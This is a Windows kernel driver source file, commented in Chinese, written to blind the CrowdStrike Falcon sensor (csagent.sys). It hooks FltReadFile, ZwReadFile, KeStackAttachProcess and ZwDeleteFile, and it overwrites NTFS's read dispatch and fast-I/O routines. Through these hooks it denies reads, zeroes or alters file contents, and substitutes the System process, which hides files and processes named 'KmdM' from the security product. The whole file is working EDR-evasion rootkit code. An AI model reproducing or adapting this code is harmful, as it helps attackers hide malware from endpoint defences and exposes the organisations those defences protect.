/*++

其他的文件不用动,只把自己的代码放到user_main函数里就行,DriverEntry中会调用

--*/

#include<ntifs.h>
#include<ntddk.h>
#include<wdm.h>
#include<fltKernel.h>
#include<intrin.h>

#include"utils.h"
#include"module.h"
#include"pe.h"
#include"exclusivity.h"
#include"us_util.h"

#include"dependencies/kernel-hook/khook/khook/hk.h"

#pragma warning (disable : 4201)

extern "C" {
    NTSYSAPI 
        PVOID RtlPcToFileHeader(
        PVOID PcValue,
        PVOID* BaseOfImage
    );
}

//
volatile char FltReadBusy;
using FltReadFileType = decltype(&FltReadFile);     
FltReadFileType OriFltReadFile;                     //
FltReadFileType FltReadFileAddress;                 //待hook的函数地址
NTSTATUS
DetourFltReadFile(
    _In_ PFLT_INSTANCE InitiatingInstance,
    _In_ PFILE_OBJECT FileObject,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_ ULONG Length,
    _Out_writes_bytes_to_(Length, *BytesRead) PVOID Buffer,
    _In_ FLT_IO_OPERATION_FLAGS Flags,
    _Out_opt_ PULONG BytesRead,
    _In_opt_ PFLT_COMPLETED_ASYNC_IO_CALLBACK CallbackRoutine,
    _In_opt_ PVOID CallbackContext
);
//


//
volatile char NtReadBusy;
using NtReadFileType = decltype(&NtReadFile);
NtReadFileType OriNtReadFile;
NtReadFileType NtReadFileAddress;
NTSTATUS
DetourNtReadFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key
);
//

//
volatile char KeAttach;
using KeStackAttachProcessType = decltype(&KeStackAttachProcess);
KeStackAttachProcessType OriKeStackAttachProcess;
KeStackAttachProcessType KeStackAttachProcessAddress;
void DetourKeStackAttachProcess(
    PRKPROCESS   PROCESS,
    PRKAPC_STATE ApcState
);
//


//
volatile char DeleteBusy;
using ZwDeleteFileType = decltype(&ZwDeleteFile);
ZwDeleteFileType OriZwDeleteFile;
ZwDeleteFileType ZwDeleteFileAddress;
NTSTATUS DetourZwDeleteFile(
    POBJECT_ATTRIBUTES ObjectAttributes
);

BOOLEAN
DetourFastIoRead(
    _In_ struct _FILE_OBJECT* FileObject,
    _In_ PLARGE_INTEGER FileOffset,
    _In_ ULONG Length,
    _In_ BOOLEAN Wait,
    _In_ ULONG LockKey,
    _Out_ PVOID Buffer,
    _Out_ PIO_STATUS_BLOCK IoStatus,
    _In_ struct _DEVICE_OBJECT* DeviceObject
);

PVOID isCsAgentModule(PLIST_ENTRY ListEntry) {

    static UNICODE_STRING CsAgent = RTL_CONSTANT_STRING(L"csagent.sys");
    PKLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(ListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

    if (!RtlCompareUnicodeString(&CsAgent, &pEntry->BaseDllName, true)) {
        return pEntry->DllBase;
    }

    return false;
}

PVOID isFlgMgrModule(PLIST_ENTRY ListEntry) {
    static UNICODE_STRING FltMgr = RTL_CONSTANT_STRING(L"fltmgr.sys");
    PKLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(ListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

    if (!RtlCompareUnicodeString(&FltMgr, &pEntry->BaseDllName, true)) {
        return pEntry->DllBase;
    }

    return false;
}

static PVOID CsAgentBase;
static PVOID FltMgrBase;
static PVOID NtBase;

UNICODE_STRING SystemRunExe = RTL_CONSTANT_STRING(L"\\Users\\user\\Desktop\\system_run.exe");
UNICODE_STRING Ntfs = RTL_CONSTANT_STRING(L"\\??\\C:\\Windows\\System32\\drivers\\ntfs.sys");
FILE_OBJECT* NtfsFile;
DEVICE_OBJECT* NtfsDevice;
PDRIVER_DISPATCH OriFltMgrIrpMjRead;
NTSTATUS HandlerIrpRead(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
PFAST_IO_READ OriFltMgrFastIoRead;

void user_main(PDRIVER_OBJECT drv, PUNICODE_STRING reg) {

    UNREFERENCED_PARAMETER(reg);
    UNREFERENCED_PARAMETER(drv);
    NTSTATUS Status;


    Status = IoGetDeviceObjectPointer(&Ntfs, FILE_ALL_ACCESS, &NtfsFile, &NtfsDevice); //minifilter挂靠在ntfs上
    if (!NT_SUCCESS(Status))
    {
        print("[-]IoGetDeviceObjectPointer failed with %x\n", Status);
        return;
    }
    
    OriFltMgrIrpMjRead = NtfsDevice->DriverObject->MajorFunction[IRP_MJ_READ];
    OriFltMgrFastIoRead = NtfsDevice->DriverObject->FastIoDispatch->FastIoRead;
    NtfsDevice->DriverObject->MajorFunction[IRP_MJ_READ] = HandlerIrpRead;
    NtfsDevice->DriverObject->FastIoDispatch->FastIoRead = DetourFastIoRead;

    //获得需要的模块基址

    CsAgentBase = kmodule::get_module<PVOID>(isCsAgentModule);
    FltMgrBase = kmodule::get_module<PVOID>(isFlgMgrModule);
    RtlPcToFileHeader(NtReadFile, &NtBase);
    
    if (!((ULONG64)CsAgentBase & (ULONG64)FltMgrBase & (ULONG64)NtBase))
        return;

    //获得需要hook的函数地址

    FltReadFileAddress = (FltReadFileType)GetDriverExportRoutine(FltMgrBase, "FltReadFile");
    if (!FltReadFileAddress)
        return;

    NtReadFileAddress = (NtReadFileType)GetDriverExportRoutine(NtBase, "ZwReadFile");
    if (!NtReadFileAddress)
        return;

    KeStackAttachProcessAddress = (KeStackAttachProcessType)GetDriverExportRoutine(NtBase, "KeStackAttachProcess");
    if (!KeStackAttachProcessAddress)
        return;

    ZwDeleteFileAddress = (ZwDeleteFileType)GetDriverExportRoutine(NtBase, "ZwDeleteFile");
    if (!ZwDeleteFileAddress)
        return;

    print("[+]CsAgentBase : %p\n", CsAgentBase);
    print("[+]FltMgrBase : %p\n", FltMgrBase);
    print("[+]FltReadFile : %p\n", FltReadFileAddress);
    print("[+]NtReadFile : %p\n", NtReadFileAddress);
    print("[+]KeStackAttachProcess : %p\n", KeStackAttachProcessAddress);
    print("[+]ZwDeleteFile %p\n", ZwDeleteFileAddress);

    //hook

    Status = HkDetourFunction(FltReadFileAddress, DetourFltReadFile, (PVOID*)&OriFltReadFile);
    if (!NT_SUCCESS(Status)) {
        print("[-]hook FltReadFile failed\n");
        return;
    }
    Status = HkDetourFunction(NtReadFileAddress, DetourNtReadFile, (PVOID*)&OriNtReadFile);
    if (!NT_SUCCESS(Status)) {
        HkRestoreFunction(FltReadFileAddress, OriFltReadFile);
        print("[-]hook NtReadFile failed\n");
        return;
    }

    Status = HkDetourFunction(KeStackAttachProcessAddress, DetourKeStackAttachProcess, (PVOID*)&OriKeStackAttachProcess);
    if (!NT_SUCCESS(Status)) {
        HkRestoreFunction(FltReadFileAddress, OriFltReadFile);
        HkRestoreFunction(NtReadFileAddress, OriNtReadFile);
        print("[-]hook KeStackAttachProcess failed\n");
        return;
    }

    Status = HkDetourFunction(ZwDeleteFileAddress, DetourZwDeleteFile, (PVOID*)&OriZwDeleteFile);
    if (!NT_SUCCESS(Status)) {
        HkRestoreFunction(FltReadFileAddress, OriFltReadFile);
        HkRestoreFunction(NtReadFileAddress, OriNtReadFile);
        HkRestoreFunction(KeStackAttachProcessAddress, OriKeStackAttachProcess);
        print("[-]hook ZwDeleteFile failed\n");
        return;
    }


    pe64 CsAgentPe(CsAgentBase);
    CsAgentPe.print_dos_headers();
    CsAgentPe.print_nt_headers();
    CsAgentPe.print_sections();














    return;
}

void unload(PDRIVER_OBJECT drv) {
    UNREFERENCED_PARAMETER(drv);

    NTSTATUS Status;
    NtfsDevice->DriverObject->MajorFunction[IRP_MJ_READ] = OriFltMgrIrpMjRead;

    //先判断其他处理器有没有正在运行hook代理函数的

    while (_InterlockedCompareExchange8(&FltReadBusy,1,1) || _InterlockedCompareExchange8(&NtReadBusy, 1, 1) || _InterlockedCompareExchange8(&KeAttach, 1, 1) || _InterlockedCompareExchange8(&DeleteBusy, 1, 1)) {
        print("[-]lock is busy,probably bugcheck, wait ...\n");
    }

    //没有的话把他们挂起来,防止取消hook的时候又进去了
    void* Ex = ExclGainExclusivity();

    //开始恢复hook

    if (OriFltReadFile) {
        Status = HkRestoreFunction(FltReadFileAddress, OriFltReadFile);
        print("[+]unhook FltReadFile... Status : %x\n",Status);
    }
    if (OriNtReadFile) {
        Status = HkRestoreFunction(NtReadFileAddress, OriNtReadFile);
        print("[+]unhook NtReadFile... Status : %x\n", Status);
    }

    if (OriKeStackAttachProcess) {
        Status = HkRestoreFunction(KeStackAttachProcessAddress, OriKeStackAttachProcess);
        print("[+]unhook KeStackAttachProcess... Status : %x\n", Status);
    }

    if (OriZwDeleteFile) {
        Status = HkRestoreFunction(ZwDeleteFileAddress, OriZwDeleteFile);
        print("[+]unhook OZwDeleteFile... Status : %x\n", Status);
    }


    //恢复其他核心
    ExclReleaseExclusivity(Ex);


    print("[+]driver unload...\n");
}


NTSTATUS
DetourFltReadFile(
    _In_ PFLT_INSTANCE InitiatingInstance,
    _In_ PFILE_OBJECT FileObject,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_ ULONG Length,
    _Out_writes_bytes_to_(Length, *BytesRead) PVOID Buffer,
    _In_ FLT_IO_OPERATION_FLAGS Flags,
    _Out_opt_ PULONG BytesRead,
    _In_opt_ PFLT_COMPLETED_ASYNC_IO_CALLBACK CallbackRoutine,
    _In_opt_ PVOID CallbackContext
) {
    NTSTATUS Status;
    FltReadBusy = true;

    //if (RtlFindSubUnicodeStringWithNoCase(L"KmdM", &FileObject->FileName) != 0) {
        //print("[+]FltReadFile Read File : %wZ ByteOffset : 0x%llx  Length : 0x%x\n", FileObject->FileName, ByteOffset->QuadPart, Length);
        //return STATUS_ACCESS_DENIED;
    //}

    Status = OriFltReadFile(InitiatingInstance, FileObject, ByteOffset, Length, Buffer, Flags, BytesRead, CallbackRoutine, CallbackContext);
    if (RtlFindSubUnicodeStringWithNoCase(L"KmdM", &FileObject->FileName) != 0) {
        memcpy(Buffer, "12", 2);
    }
    FltReadBusy = false;
    return Status;
}



NTSTATUS
DetourNtReadFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key
) {
    NTSTATUS Status;
    FILE_OBJECT* FileObject;
    PVOID ReturnAddress = _ReturnAddress();
    PVOID BaseImage;
    NtReadBusy = true;

    Status = ObReferenceObjectByHandle(FileHandle, GENERIC_READ, *IoFileObjectType, KernelMode, (PVOID*)&FileObject, NULL);
    if (NT_SUCCESS(Status)) {
        RtlPcToFileHeader(ReturnAddress, &BaseImage);
        //if (BaseImage == CsAgentBase) {
            //print("[+]CrowdStrike NtReadFile Read File : %wZ Length : 0x%x\n", FileObject->FileName, Length);
        if (RtlFindSubUnicodeStringWithNoCase(L"KmdM", &FileObject->FileName) != 0) {
                Status = OriNtReadFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key);
                print("[+]fake buffer\n");
                if (NT_SUCCESS(Status)) {
                    memset(Buffer, 0, Length);
                }

                NtReadBusy = false;
                return Status;
            
        }
            
        //}
    }
    else {
        if (RtlFindSubUnicodeStringWithNoCase(L"KmdM", &FileObject->FileName) != 0)
        {
            print("[-]!!!\n");
        }
        print("[-]ObReferenceObjectByHandle failed with %x\n", Status);
    }





    Status = OriNtReadFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key);
    NtReadBusy = false;
    return Status;
}

void DetourKeStackAttachProcess(
    PRKPROCESS   PROCESS,
    PRKAPC_STATE ApcState
) {
    PVOID ReturnAddress = _ReturnAddress();
    PVOID BaseImage;

    KeAttach = true;
    RtlPcToFileHeader(ReturnAddress, &BaseImage);
    if (BaseImage == CsAgentBase) {
        print("[+]CrowdStrike AttachProcess  : %s\n", PsGetProcessImageFileName(PROCESS));

        if (stristr((const char*)PsGetProcessImageFileName(PROCESS), "system_run") != 0) {
            dbgbreak();
        }
        else if (stristr((const char*)PsGetProcessImageFileName(PROCESS), "KmdM") != 0) {
            print("[+]fake eprocess\n");
            PROCESS = PsInitialSystemProcess;
        }


    }

    OriKeStackAttachProcess(PROCESS, ApcState);
    KeAttach = false;
    return;
}

NTSTATUS DetourZwDeleteFile(
    POBJECT_ATTRIBUTES ObjectAttributes
) {
    NTSTATUS Status;
    PVOID ReturnAddress = _ReturnAddress();
    DeleteBusy = true;
    PVOID BaseImage;
    RtlPcToFileHeader(ReturnAddress, &BaseImage);
    Status = OriZwDeleteFile(ObjectAttributes);
    if (BaseImage == CsAgentBase) {
        print("[+]CrowdStrike Delete File  : %wZ Status : %x\n", *ObjectAttributes->ObjectName,Status);
    }
    DeleteBusy = false;
    return Status;
}

NTSTATUS HandlerIrpRead(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {

    PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
    if (irpStack->MajorFunction != IRP_MJ_READ)
        print("[+]irp mismatched \n");
    else
    {
        PFILE_OBJECT fo = irpStack->FileObject;
        if (RtlFindSubUnicodeStringWithNoCase(L"KmdM", &fo->FileName) != 0) {
            print("[+]raw irp info : Length 0x%x , ByteOffset 0x%llx\n", irpStack->Parameters.Read.Length, irpStack->Parameters.Read.ByteOffset);
            //if(ExGetPreviousMode() == KernelMode)
                return STATUS_ACCESS_DENIED;
        }
    }

    return OriFltMgrIrpMjRead(DeviceObject, Irp);
}

BOOLEAN
DetourFastIoRead(
    _In_ struct _FILE_OBJECT* FileObject,
    _In_ PLARGE_INTEGER FileOffset,
    _In_ ULONG Length,
    _In_ BOOLEAN Wait,
    _In_ ULONG LockKey,
    _Out_ PVOID Buffer,
    _Out_ PIO_STATUS_BLOCK IoStatus,
    _In_ struct _DEVICE_OBJECT* DeviceObject
) {
    if (RtlFindSubUnicodeStringWithNoCase(L"KmdM", &FileObject->FileName) != 0) {
        print("[-]fast io occur\n");
        return false;
    }

    return OriFltMgrFastIoRead(FileObject, FileOffset, Length, Wait, LockKey, Buffer, IoStatus, DeviceObject);
}